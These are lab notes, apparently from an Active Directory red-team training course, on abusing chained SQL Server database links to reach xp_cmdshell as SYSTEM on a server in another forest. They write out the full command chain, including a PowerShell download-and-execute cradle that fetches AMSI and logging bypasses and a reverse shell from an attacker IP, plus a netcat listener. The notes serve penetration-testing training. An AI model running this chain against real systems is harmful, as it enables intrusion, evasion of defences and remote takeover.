# Learning Objective 22

* Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.

***

<mark style="background-color:yellow;">Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them.</mark>

<mark style="background-color:yellow;">We can use PowerUpSQL module for that.</mark>

Run the below command from a PowerShell session started using Invisi-Shell:

## Enumerate PowerUpSQL

> cd C:\AD\Tools\PowerUpSQL-master (Remember the invishell)

```
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

So, we can connect to dcorp-mssql.

> dcorp-mssql es del dominio dollarcorp.moneycorp.local (el mismo que tú).

### Enumerar links con HeidiSQL (GUI)

Using HeidiSQL client, let’s login to dcorp-mssql using windows authentication of studentx.

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

After login, enumerate linked databases on dcorp-mssql:

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```
select * from master..sysservers
```

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

So, there is a database link to dcorp-sql1 from dcorp-mssql.

Let’s enumerate further links from dcorp-sql1. This can be done with the help of openquery:

> \-- Links desde dcorp-sql1

```
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

It is possible to nest openquery within another openquery which leads us to dcorp-mgmt:

> \-- Links desde dcorp-mgmt (nested)

```
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

We can also use `Get-SQLServerLinkCrawl` for crawling the database links automatically:

### Automatic Enumeration Linkers

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Sweet! We have sysadmin on eu-sqlx server!

### Verify "xp\_cmdshell" function exist

> 1 — Verifica que xp\_cmdshell está habilitado en eu-sqlX. xp\_cmdshell es un procedimiento almacenado de SQL Server que permite ejecutar comandos del sistema operativo directamente desde SQL. Si está deshabilitado, no puedes ejecutar nada en el OS.
>
> 2 — Ejecuta el comando set username a través de toda la cadena de links para confirmar que llegas a eu-sqlX con privilegios de SYSTEM.\
> El resultado CustomQuery : {USERNAME=SYSTEM, } confirma: - xp\_cmdshell está activo
>
> * Llegas a eu-sqlX o -->
> * Corres como SYSTEM (el usuario más privilegiado de Windows)

If `xp_cmdshell` is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sqlx using linked databases.

To avoid dealing with a large number of quotes and escapes, we can use the following command:

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'set username'"
```

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Nice! Thi goes as far as the EU-SQL so... I prepare the RS

### Revershell usin "xp\_cmdshell"

> * Create a copy of Invoke-PowerShellTcp.ps1 and rename it to Invoke-PowerShellTcpEx.ps1.
> * Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).
> * Add `Power -Reverse -IPAddress 172.16.100.X -Port 443` (without quotes) to the end of the file.

Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sqlx instance.

Remember to start a listener:

> ```
> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
> ```

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
```

> Remember change us IP and the eu-sqlX
>
> Remember to start the web server WITH (Invoke-PowerShellTcpEx.ps1, Amsi-Byp.txt, sbloggingbypass.txt)
>
> <img src="../../../.gitbook/assets/image (33).png" alt="" data-size="original">

> In the Invoke-PowerShellTcpEx.ps1 edit and put you IP

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Execute all and On the listener:

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

```
$env:username
$env:computername
```

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

***

Los links == Es como decirle a SQL Server: "cuando alguien haga una query a DCORP-SQL1, puedes ir a buscar datos a DCORP-MGMT automáticamente"??

> El problema de seguridad es que estos links tienen credenciales hardcodeadas — el administrador configuró "cuando vayas a DCORP-MGMT, conéctate como sqluser".

Esas credenciales viajan automáticamente sin que el usuario que inició la query las vea ni las controle.\
La cadena en este lab:\
Tú (student453, sin privilegios)\
→ dcorp-mssql \[te conectas con tu ticket Kerberos]

→ DCORP-SQL1 \[link configurado, usa credencial "dblinkuser"]

→ DCORP-MGMT \[link configurado, usa credencial "sqluser"]

→ eu-sqlX \[link configurado, usa credencial "sa" = sysadmin]

Cada salto usa una credencial diferente configurada por el admin. Tú solo iniciaste la primera conexión como usuario normal, pero al final de la cadena estás ejecutando queries con sa (sysadmin) en un servidor de otro bosque. Es básicamente privilege escalation a través de confianza implícita entre servidores SQL.
